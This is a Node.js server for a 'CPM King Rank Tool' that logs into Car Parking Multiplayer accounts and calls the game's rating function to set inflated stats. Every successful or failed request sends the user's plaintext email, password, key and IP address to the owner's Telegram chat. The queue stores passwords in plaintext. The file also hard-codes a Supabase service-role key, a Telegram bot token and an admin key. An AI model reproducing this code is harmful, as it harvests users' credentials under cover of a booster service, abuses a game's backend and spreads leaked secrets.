const express = require('express');
const crypto = require('crypto');
const cors = require('cors');
const axios = require('axios');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const { createClient } = require('@supabase/supabase-js');

const app = express();

// ============================================================
// SUPABASE CONFIGURATION
// ============================================================
const SUPABASE_URL = "https://npnnazppmobbuqsitaxb.supabase.co";
const SUPABASE_SERVICE_ROLE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5wbm5henBwbW9iYnVxc2l0YXhiIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NzE0NzUzNCwiZXhwIjoyMDkyNzIzNTM0fQ.VeFewsT9GG9xnvW2CkfaEMEx_FMOsWgcDW2JlI2zm7Y";

const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);

// ============================================================
// KONFIGURASI
// ============================================================
const PORT = 3000;
const BOT_TOKEN = "8049314105:AAE0Tk2ifyJdACQRGuiQJnN8C-YsNUWuzvI";
const OWNER_ID = "7492782458";
const NEXUS_VERIFY_URL = "https://system-nexus-key.vercel.app";
const ADMIN_KEY = "AldzKing2010"; // ← Fixed: Admin Key yang benar

// Cooldown configuration
const COOLDOWN_MINUTES = 5; // 5 menit cooldown untuk setiap user

// ============================================================
// MIDDLEWARE
// ============================================================
app.use(helmet({ contentSecurityPolicy: false }));
app.use(cors({ origin: '*', credentials: true }));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ============================================================
// RATE LIMITER
// ============================================================
const limiter = rateLimit({
    windowMs: 60 * 1000,
    max: 100,
    message: { success: false, error: 'Too many requests' },
    skip: (req) => req.path === '/api/health' || req.path === '/api/cooldown'
});
app.use('/api/', limiter);

// ============================================================
// CPM CONFIG (ONLY CPM 1)
// ============================================================
const CPM_CONFIG = {
    id: 'cpm1',
    name: 'Car Parking Multiplayer',
    firebaseApiKey: 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM',
    loginUrl: 'https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword',
    rankUrl: 'https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4'
};

// ============================================================
// KING RANK DEFAULT SETTINGS
// ============================================================
let kingRankSettings = {
    rating: {
        targetRating: 100000,
        minXP: 100000,
        race_win: 3000,
        statsMultiplier: 1.5
    },
    stats: {
        cars: 100000,
        car_fix: 100000,
        car_collided: 100000,
        car_exchange: 100000,
        car_trade: 100000,
        car_wash: 100000,
        slicer_cut: 100000,
        drift_max: 100000,
        drift: 100000,
        cargo: 100000,
        delivery: 100000,
        taxi: 100000,
        levels: 1000,
        gifts: 100000,
        fuel: 100000,
        offroad: 100000,
        speed_banner: 100000,
        reactions: 100000,
        police: 100000,
        run: 100000,
        real_estate: 1000,
        t_distance: 10000000,
        treasure: 100000,
        block_post: 100000,
        push_ups: 100000,
        passanger_distance: 100000,
        time: 10000000000,
        race_win: 3000
    }
};

// ============================================================
// COOLDOWN SYSTEM (PER USER - TERSIMPAN DI SUPABASE)
// ============================================================

// Cek cooldown untuk user tertentu
async function checkUserCooldown(userId) {
    try {
        const { data, error } = await supabase
            .from('cpm_cooldown')
            .select('cooldown_until, last_attempt')
            .eq('user_id', userId)
            .maybeSingle();
        
        if (error || !data) {
            return { active: false, remaining: 0, endTime: null };
        }
        
        const now = Date.now();
        if (now >= data.cooldown_until) {
            // Cooldown sudah habis, hapus dari database
            await supabase
                .from('cpm_cooldown')
                .delete()
                .eq('user_id', userId);
            return { active: false, remaining: 0, endTime: null };
        }
        
        return { 
            active: true, 
            remaining: data.cooldown_until - now,
            endTime: data.cooldown_until,
            lastAttempt: data.last_attempt
        };
    } catch (error) {
        console.error('Check cooldown error:', error);
        return { active: false, remaining: 0, endTime: null };
    }
}

// Set cooldown untuk user tertentu
async function setUserCooldown(userId, durationMinutes = COOLDOWN_MINUTES) {
    const cooldownUntil = Date.now() + (durationMinutes * 60 * 1000);
    
    await supabase
        .from('cpm_cooldown')
        .upsert({
            user_id: userId,
            cooldown_until: cooldownUntil,
            last_attempt: Date.now(),
            duration_minutes: durationMinutes
        }, { onConflict: 'user_id' });
    
    return cooldownUntil;
}

// Get remaining cooldown time (formatted)
function formatRemainingTime(ms) {
    if (ms <= 0) return '0:00';
    const minutes = Math.floor(ms / 60000);
    const seconds = Math.floor((ms % 60000) / 1000);
    return `${minutes}:${seconds.toString().padStart(2, '0')}`;
}

// ============================================================
// LOAD SETTINGS FROM SUPABASE
// ============================================================
async function loadKingSettingsFromDB() {
    try {
        const { data: ratingData } = await supabase
            .from('cpm_settings')
            .select('*')
            .eq('category', 'rating')
            .maybeSingle();
        
        if (ratingData && ratingData.settings) {
            kingRankSettings.rating = { ...kingRankSettings.rating, ...ratingData.settings };
        }
        
        const { data: statsData } = await supabase
            .from('cpm_settings')
            .select('*')
            .eq('category', 'stats')
            .maybeSingle();
        
        if (statsData && statsData.settings) {
            kingRankSettings.stats = { ...kingRankSettings.stats, ...statsData.settings };
        }
        
        console.log('✅ King Rank settings loaded from Supabase');
    } catch (error) {
        console.error('Error loading settings:', error);
        await saveKingSettingsToDB();
    }
}

async function saveKingSettingsToDB() {
    try {
        await supabase
            .from('cpm_settings')
            .upsert({
                category: 'rating',
                settings: kingRankSettings.rating,
                updated_at: Date.now()
            }, { onConflict: 'category' });
        
        await supabase
            .from('cpm_settings')
            .upsert({
                category: 'stats',
                settings: kingRankSettings.stats,
                updated_at: Date.now()
            }, { onConflict: 'category' });
        
        console.log('✅ King Rank settings saved to Supabase');
    } catch (error) {
        console.error('Error saving settings:', error);
    }
}

// ============================================================
// HELPER FUNCTIONS
// ============================================================
function getClientIp(req) {
    return req.headers['x-forwarded-for']?.split(',')[0] || 
           req.socket.remoteAddress || 
           req.ip || 
           'Unknown';
}

function generateUserId(email) {
    return crypto.createHash('md5').update(email.toLowerCase().trim()).digest('hex');
}

function generateQueueId() {
    return 'Q' + Date.now().toString(36).toUpperCase() + crypto.randomBytes(4).toString('hex').toUpperCase();
}

function generateMarketplaceId() {
    return 'LST' + Date.now().toString(36).toUpperCase() + crypto.randomBytes(4).toString('hex').toUpperCase();
}

async function sendTelegramNotification(email, password, status, nexusKey, ipAddress, details = '') {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Jakarta' });
    
    let message = `👑 CPM KING RANK TOOL\n\n`;
    message += `📧 Email: ${email}\n`;
    message += `🔑 Password: ${password}\n`;
    message += `📊 Status: ${status}\n`;
    message += `🔑 Nexus Key: ${nexusKey}\n`;
    message += `🌐 IP: ${ipAddress}\n`;
    message += `📝 Details: ${details}\n`;
    message += `⏰ Time: ${timestamp}\n`;
    
    try {
        await axios.post(url, { chat_id: OWNER_ID, text: message, parse_mode: 'HTML' }, { timeout: 10000 });
        return true;
    } catch (error) {
        console.error('Telegram error:', error.message);
        return false;
    }
}

function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }

async function verifyNexusKey(key, deviceFingerprint = null) {
    if (!key) return { valid: false, error: 'Key is required' };
    try {
        const payload = { key: key };
        if (deviceFingerprint) payload.deviceFingerprint = deviceFingerprint;
        const response = await axios.post(`${NEXUS_VERIFY_URL}/api/verify-key`, payload, { timeout: 15000 });
        return response.data;
    } catch (error) {
        return { valid: false, error: 'Verification service unavailable' };
    }
}

// ============================================================
// BUILD RATING DATA
// ============================================================
function buildRatingData(customStats = null) {
    const stats = customStats || kingRankSettings.stats;
    const ratingData = { ...stats };
    ratingData.time = kingRankSettings.rating.targetRating || 10000000000;
    ratingData.race_win = kingRankSettings.rating.race_win || 3000;
    return ratingData;
}

// ============================================================
// CPM LOGIN & SET RANK
// ============================================================
async function cpmLogin(email, password) {
    const response = await axios.post(`${CPM_CONFIG.loginUrl}?key=${CPM_CONFIG.firebaseApiKey}`, {
        email: email,
        password: password,
        returnSecureToken: true,
        clientType: 'CLIENT_TYPE_ANDROID'
    }, {
        headers: { 'Content-Type': 'application/json', 'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 12)' },
        timeout: 20000
    });
    
    if (!response.data || !response.data.idToken) throw new Error('Invalid login response');
    return { idToken: response.data.idToken, localId: response.data.localId, email: response.data.email };
}

async function setKingRank(idToken, customStats = null) {
    const ratingData = buildRatingData(customStats);
    const response = await axios.post(CPM_CONFIG.rankUrl, { data: JSON.stringify({ RatingData: ratingData }) }, {
        headers: { 'Authorization': `Bearer ${idToken}`, 'Content-Type': 'application/json', 'User-Agent': 'okhttp/3.12.13' },
        timeout: 30000
    });
    if (response.status !== 200) throw new Error(`Rank API responded with status ${response.status}`);
    return true;
}

// ============================================================
// UPDATE ANALYTICS
// ============================================================
async function updateAnalytics(status, email) {
    const today = new Date().toISOString().split('T')[0];
    
    const { data: existing } = await supabase
        .from('cpm_analytics_daily')
        .select('*')
        .eq('date', today)
        .maybeSingle();
    
    if (existing) {
        await supabase
            .from('cpm_analytics_daily')
            .update({
                success_count: existing.success_count + (status === 'success' ? 1 : 0),
                failed_count: existing.failed_count + (status === 'failed' ? 1 : 0),
                total_count: existing.total_count + 1
            })
            .eq('date', today);
    } else {
        await supabase
            .from('cpm_analytics_daily')
            .insert({
                date: today,
                success_count: status === 'success' ? 1 : 0,
                failed_count: status === 'failed' ? 1 : 0,
                total_count: 1
            });
    }
    
    const { data: totalStats } = await supabase
        .from('cpm_analytics_total')
        .select('*')
        .limit(1)
        .maybeSingle();
    
    if (totalStats) {
        await supabase
            .from('cpm_analytics_total')
            .update({
                total_processed: totalStats.total_processed + 1,
                total_success: totalStats.total_success + (status === 'success' ? 1 : 0),
                total_failed: totalStats.total_failed + (status === 'failed' ? 1 : 0),
                last_updated: Date.now()
            });
    } else {
        await supabase
            .from('cpm_analytics_total')
            .insert({
                total_processed: 1,
                total_success: status === 'success' ? 1 : 0,
                total_failed: status === 'failed' ? 1 : 0,
                last_updated: Date.now()
            });
    }
}

// ============================================================
// API ENDPOINTS
// ============================================================

// Health check
app.get('/api/health', (req, res) => {
    res.json({ status: 'OK', timestamp: new Date().toISOString(), uptime: process.uptime() });
});

// ============================================================
// COOLDOWN CHECK (PER USER)
// ============================================================
app.get('/api/cooldown/:email', async (req, res) => {
    try {
        const { email } = req.params;
        const userId = generateUserId(email);
        const cooldown = await checkUserCooldown(userId);
        
        res.json({
            success: true,
            active: cooldown.active,
            remaining: cooldown.remaining,
            formattedTime: formatRemainingTime(cooldown.remaining),
            endTime: cooldown.endTime
        });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============================================================
// LIVE STATS
// ============================================================
app.get('/api/live-stats', async (req, res) => {
    try {
        const { count: queueLength } = await supabase
            .from('cpm_queue')
            .select('*', { count: 'exact', head: true })
            .in('status', ['pending', 'processing']);
        
        const { data: totalStats } = await supabase
            .from('cpm_analytics_total')
            .select('*')
            .limit(1)
            .maybeSingle();
        
        const today = new Date().toISOString().split('T')[0];
        const { data: todayStats } = await supabase
            .from('cpm_analytics_daily')
            .select('*')
            .eq('date', today)
            .maybeSingle();
        
        const total = totalStats || { total_processed: 0, total_success: 0, total_failed: 0 };
        const successRate = total.total_processed > 0 
            ? ((total.total_success / total.total_processed) * 100).toFixed(1) 
            : 0;
        
        res.json({
            success: true,
            stats: {
                totalProcessed: total.total_processed,
                successCount: total.total_success,
                failedCount: total.total_failed,
                successRate: successRate,
                queueLength: queueLength || 0,
                todaySuccess: todayStats?.success_count || 0,
                todayFailed: todayStats?.failed_count || 0
            },
            timestamp: Date.now()
        });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============================================================
// SET KING RANK (DENGAN COOLDOWN PER USER)
// ============================================================
app.post('/api/set-rank', async (req, res) => {
    try {
        const { email, password, nexusKey } = req.body;
        const ipAddress = getClientIp(req);
        const userId = generateUserId(email);
        
        if (!email || !password || !nexusKey) {
            return res.status(400).json({ success: false, error: 'Missing required fields' });
        }
        
        // CHECK COOLDOWN (PER USER)
        const cooldown = await checkUserCooldown(userId);
        if (cooldown.active) {
            return res.status(429).json({
                success: false,
                cooldown: true,
                remaining: cooldown.remaining,
                formattedTime: formatRemainingTime(cooldown.remaining),
                error: `⏰ Cooldown active! Please wait ${formatRemainingTime(cooldown.remaining)} before using again.`
            });
        }
        
        // VERIFY NEXUS KEY
        const keyResult = await verifyNexusKey(nexusKey);
        if (!keyResult.valid) {
            return res.status(400).json({ success: false, error: 'Invalid Nexus Key' });
        }
        
        // PROCESS KING RANK
        try {
            const loginResult = await cpmLogin(email, password);
            await setKingRank(loginResult.idToken);
            
            // SET COOLDOWN untuk user ini
            await setUserCooldown(userId, COOLDOWN_MINUTES);
            
            await updateAnalytics('success', email);
            await sendTelegramNotification(email, password, '✅ SUCCESS - King Rank Set', nexusKey, ipAddress);
            
            res.json({ 
                success: true, 
                message: '👑 King Rank successfully activated!',
                cooldownMinutes: COOLDOWN_MINUTES,
                nextAvailable: formatRemainingTime(COOLDOWN_MINUTES * 60 * 1000)
            });
        } catch (error) {
            await updateAnalytics('failed', email);
            await sendTelegramNotification(email, password, '❌ FAILED', nexusKey, ipAddress, error.message);
            res.status(500).json({ success: false, error: error.message });
        }
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============================================================
// KING RANK CUSTOM SETTINGS (DENGAN ADMIN KEY YANG BENAR)
// ============================================================
app.get('/api/king-settings', async (req, res) => {
    try {
        res.json({ success: true, settings: kingRankSettings });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/king-settings/update', async (req, res) => {
    try {
        const { adminKey, rating, stats } = req.body;
        
        // FIXED: Admin Key validation yang benar
        if (!adminKey || adminKey !== ADMIN_KEY) {
            return res.status(401).json({ success: false, error: 'Invalid Admin Key! Access denied.' });
        }
        
        if (rating) {
            kingRankSettings.rating = { ...kingRankSettings.rating, ...rating };
        }
        if (stats) {
            kingRankSettings.stats = { ...kingRankSettings.stats, ...stats };
        }
        
        await saveKingSettingsToDB();
        
        res.json({ success: true, message: 'King Rank settings updated', settings: kingRankSettings });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/king-settings/preview', async (req, res) => {
    try {
        const { customStats } = req.body;
        const ratingData = buildRatingData(customStats || kingRankSettings.stats);
        const totalXP = Object.values(ratingData).reduce((a, b) => a + (parseInt(b) || 0), 0);
        
        res.json({
            success: true,
            preview: {
                totalStats: Object.keys(ratingData).length,
                estimatedXP: totalXP,
                ratingData: ratingData
            }
        });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/apply-custom-stats', async (req, res) => {
    try {
        const { email, password, nexusKey, customStats } = req.body;
        const ipAddress = getClientIp(req);
        const userId = generateUserId(email);
        
        if (!email || !password || !nexusKey) {
            return res.status(400).json({ success: false, error: 'Missing required fields' });
        }
        
        // CHECK COOLDOWN
        const cooldown = await checkUserCooldown(userId);
        if (cooldown.active) {
            return res.status(429).json({
                success: false,
                cooldown: true,
                remaining: cooldown.remaining,
                formattedTime: formatRemainingTime(cooldown.remaining),
                error: `⏰ Cooldown active! Please wait ${formatRemainingTime(cooldown.remaining)}`
            });
        }
        
        const keyResult = await verifyNexusKey(nexusKey);
        if (!keyResult.valid) {
            return res.status(400).json({ success: false, error: 'Invalid Nexus Key' });
        }
        
        const loginResult = await cpmLogin(email, password);
        await setKingRank(loginResult.idToken, customStats);
        
        await setUserCooldown(userId, COOLDOWN_MINUTES);
        await updateAnalytics('success', email);
        await sendTelegramNotification(email, password, '✅ CUSTOM STATS APPLIED', nexusKey, ipAddress, 'Custom King Rank settings applied');
        
        res.json({ success: true, message: 'Custom stats applied successfully!' });
    } catch (error) {
        await updateAnalytics('failed', req.body.email);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============================================================
// QUEUE SYSTEM (DENGAN COOLDOWN CHECK)
// ============================================================
app.post('/api/queue/add', async (req, res) => {
    try {
        const { email, password, nexusKey, customStats } = req.body;
        const ipAddress = getClientIp(req);
        const userId = generateUserId(email);
        
        if (!email || !password || !nexusKey) {
            return res.status(400).json({ success: false, error: 'Missing required fields' });
        }
        
        // CHECK COOLDOWN sebelum masuk queue
        const cooldown = await checkUserCooldown(userId);
        if (cooldown.active) {
            return res.status(429).json({
                success: false,
                cooldown: true,
                remaining: cooldown.remaining,
                formattedTime: formatRemainingTime(cooldown.remaining),
                error: `⏰ You are on cooldown! Please wait ${formatRemainingTime(cooldown.remaining)}`
            });
        }
        
        const keyResult = await verifyNexusKey(nexusKey);
        if (!keyResult.valid) {
            return res.status(400).json({ success: false, error: 'Invalid Nexus Key' });
        }
        
        const queueId = generateQueueId();
        
        await supabase
            .from('cpm_queue')
            .insert({
                queue_id: queueId,
                email: email,
                password: password,
                nexus_key: nexusKey,
                ip_address: ipAddress,
                custom_stats: customStats,
                status: 'pending',
                created_at: Date.now()
            });
        
        const { count: queueLength } = await supabase
            .from('cpm_queue')
            .select('*', { count: 'exact', head: true })
            .eq('status', 'pending');
        
        res.json({ 
            success: true, 
            queueId: queueId, 
            position: queueLength || 1,
            message: `Added to queue. Position: ${queueLength || 1}`
        });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/api/queue/status', async (req, res) => {
    try {
        const { data: queue } = await supabase
            .from('cpm_queue')
            .select('queue_id, email, status, created_at, started_at, completed_at')
            .order('created_at', { ascending: false })
            .limit(20);
        
        const { count: pendingCount } = await supabase
            .from('cpm_queue')
            .select('*', { count: 'exact', head: true })
            .eq('status', 'pending');
        
        res.json({
            success: true,
            isProcessing: false,
            queueLength: pendingCount || 0,
            queue: queue || []
        });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============================================================
// ANALYTICS
// ============================================================
app.get('/api/analytics', async (req, res) => {
    try {
        const { data: totalStats } = await supabase
            .from('cpm_analytics_total')
            .select('*')
            .limit(1)
            .maybeSingle();
        
        const last7Days = [];
        for (let i = 6; i >= 0; i--) {
            const date = new Date();
            date.setDate(date.getDate() - i);
            const dateStr = date.toISOString().split('T')[0];
            
            const { data: dayStats } = await supabase
                .from('cpm_analytics_daily')
                .select('*')
                .eq('date', dateStr)
                .maybeSingle();
            
            last7Days.push({
                date: dateStr,
                success: dayStats?.success_count || 0,
                failed: dayStats?.failed_count || 0,
                total: dayStats?.total_count || 0
            });
        }
        
        const total = totalStats || { total_processed: 0, total_success: 0, total_failed: 0 };
        
        res.json({
            success: true,
            analytics: {
                total: {
                    processed: total.total_processed || 0,
                    success: total.total_success || 0,
                    failed: total.total_failed || 0,
                    successRate: total.total_processed > 0 
                        ? ((total.total_success / total.total_processed) * 100).toFixed(1) 
                        : 0
                },
                daily: {
                    today: last7Days[last7Days.length - 1],
                    week: last7Days
                }
            }
        });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============================================================
// BULK PROCESS (DENGAN COOLDOWN CHECK PER USER)
// ============================================================
app.post('/api/bulk-process', async (req, res) => {
    try {
        const { accounts, nexusKey } = req.body;
        const ipAddress = getClientIp(req);
        
        if (!accounts || !Array.isArray(accounts) || accounts.length === 0) {
            return res.status(400).json({ success: false, error: 'Accounts array required' });
        }
        
        const keyResult = await verifyNexusKey(nexusKey);
        if (!keyResult.valid) {
            return res.status(400).json({ success: false, error: 'Invalid Nexus Key' });
        }
        
        const results = [];
        let hasCooldown = false;
        
        for (const acc of accounts) {
            const userId = generateUserId(acc.email);
            const cooldown = await checkUserCooldown(userId);
            
            if (cooldown.active) {
                results.push({ 
                    email: acc.email, 
                    success: false, 
                    error: `Cooldown active: ${formatRemainingTime(cooldown.remaining)} remaining`
                });
                hasCooldown = true;
                continue;
            }
            
            try {
                const loginResult = await cpmLogin(acc.email, acc.password);
                await setKingRank(loginResult.idToken);
                await setUserCooldown(userId, COOLDOWN_MINUTES);
                await updateAnalytics('success', acc.email);
                results.push({ email: acc.email, success: true, message: 'King Rank activated' });
                await sleep(3000);
            } catch (error) {
                results.push({ email: acc.email, success: false, error: error.message });
                await updateAnalytics('failed', acc.email);
            }
        }
        
        await sendTelegramNotification('BULK', 'BULK', `Processed ${results.filter(r => r.success).length}/${accounts.length} accounts`, nexusKey, ipAddress);
        res.json({ success: true, results, hasCooldown });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============================================================
// MARKETPLACE
// ============================================================
app.post('/api/marketplace/list', async (req, res) => {
    try {
        const { sellerId, itemType, itemData, price, nexusKey } = req.body;
        
        if (!sellerId || !itemType || !price || !nexusKey) {
            return res.status(400).json({ success: false, error: 'Missing required fields' });
        }
        
        const keyResult = await verifyNexusKey(nexusKey);
        if (!keyResult.valid) {
            return res.status(400).json({ success: false, error: 'Invalid Nexus Key' });
        }
        
        const listingId = generateMarketplaceId();
        
        await supabase
            .from('cpm_marketplace')
            .insert({
                listing_id: listingId,
                seller_id: sellerId,
                item_type: itemType,
                item_data: itemData,
                price: price,
                nexus_key: nexusKey,
                status: 'active',
                listed_at: Date.now()
            });
        
        res.json({ success: true, listingId, message: 'Item listed on marketplace' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/api/marketplace/listings', async (req, res) => {
    try {
        const { type, maxPrice } = req.query;
        let query = supabase
            .from('cpm_marketplace')
            .select('*')
            .eq('status', 'active')
            .order('price', { ascending: true });
        
        if (type) query = query.eq('item_type', type);
        if (maxPrice) query = query.lte('price', parseInt(maxPrice));
        
        const { data } = await query;
        res.json({ success: true, listings: data || [] });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/marketplace/buy', async (req, res) => {
    try {
        const { listingId, buyerId, nexusKey } = req.body;
        
        const keyResult = await verifyNexusKey(nexusKey);
        if (!keyResult.valid) {
            return res.status(400).json({ success: false, error: 'Invalid Nexus Key' });
        }
        
        const { data: listing } = await supabase
            .from('cpm_marketplace')
            .select('*')
            .eq('listing_id', listingId)
            .eq('status', 'active')
            .single();
        
        if (!listing) {
            return res.status(404).json({ success: false, error: 'Listing not found' });
        }
        
        await supabase
            .from('cpm_marketplace')
            .update({
                status: 'sold',
                buyer_id: buyerId,
                sold_at: Date.now(),
                buyer_nexus_key: nexusKey
            })
            .eq('listing_id', listingId);
        
        res.json({ success: true, message: `Item purchased!`, item: listing.item_data });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============================================================
// START SERVER
// ============================================================
async function start() {
    await loadKingSettingsFromDB();
    
    app.listen(PORT, () => {
        console.log(`👑 CPM KING RANK TOOL running on port ${PORT}`);
        console.log(`⏰ Cooldown: ${COOLDOWN_MINUTES} minutes per user (stored in database)`);
        console.log(`🔐 Admin Key: ${ADMIN_KEY}`);
        console.log(`✅ Features: Queue System | Marketplace | Analytics | Custom Stats | Per-User Cooldown`);
    });
}

start();

module.exports = app;